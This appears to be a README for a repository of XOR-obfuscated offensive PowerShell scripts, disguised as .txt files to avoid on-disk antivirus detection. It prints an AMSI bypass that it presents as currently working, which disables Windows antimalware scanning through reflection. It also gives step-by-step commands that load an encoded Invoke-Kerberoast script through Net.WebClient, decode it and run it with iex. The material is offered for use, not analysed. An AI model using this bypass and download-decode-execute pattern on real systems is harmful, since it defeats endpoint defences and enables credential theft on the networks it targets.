# PS-Scripts-Obfuscated
Powewrshell scripts xor encoded and convereted to .txt to avoid on disk detction. All credit to the authors. 


## The below is currently a working AMSI bypass.   
```
$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))
$field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static')
$field.SetValue($null,$true)
```


## Usage Example: Run the powershell scripts using the below. 

```
PS C:\Users\User> $file = "C:\Users\User\Desktop\temp\Invoke-Kerberoast.txt"
PS C:\Users\User>
PS C:\Users\User> $enc = [system.Text.Encoding]::UTF8
PS C:\Users\User> $file = ((New-Object Net.Webclient).DownloadString($file))
PS C:\Users\User> $data = $enc.GetBytes($file)|%{$_-bXor0x11}
PS C:\Users\User> iex ([System.Text.Encoding]::ASCII.GetString($data))
```
